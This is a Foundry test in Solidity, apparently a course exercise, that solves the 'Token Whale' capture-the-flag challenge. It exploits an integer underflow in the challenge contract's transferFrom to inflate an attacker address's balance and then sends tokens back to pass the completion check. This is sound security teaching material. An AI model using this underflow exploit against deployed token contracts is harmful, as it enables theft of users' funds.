// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma abicoder v2;

import { TokenWhaleChallenge } from "../../contracts/Week5/Ethernaut_TokenWhale.sol";
import { Test, console2 } from "forge-std/Test.sol";

contract TokenWhaleSolve is Test {
    TokenWhaleChallenge public tokenWhaleChallenge;

    address attacker;

    function setUp() external {
        tokenWhaleChallenge = new TokenWhaleChallenge(address(this));

        attacker = address(1234);
    }

    function test_solve() public {
        // approve
        tokenWhaleChallenge.approve(address(attacker), 1_000_000);

        vm.startPrank(attacker);
        // transfer to underflow
        tokenWhaleChallenge.transferFrom(address(this), address(this), 1);

        // transfer back to player
        tokenWhaleChallenge.transfer(address(this), 1_000_000);

        require(tokenWhaleChallenge.isComplete() == true);
    }
}
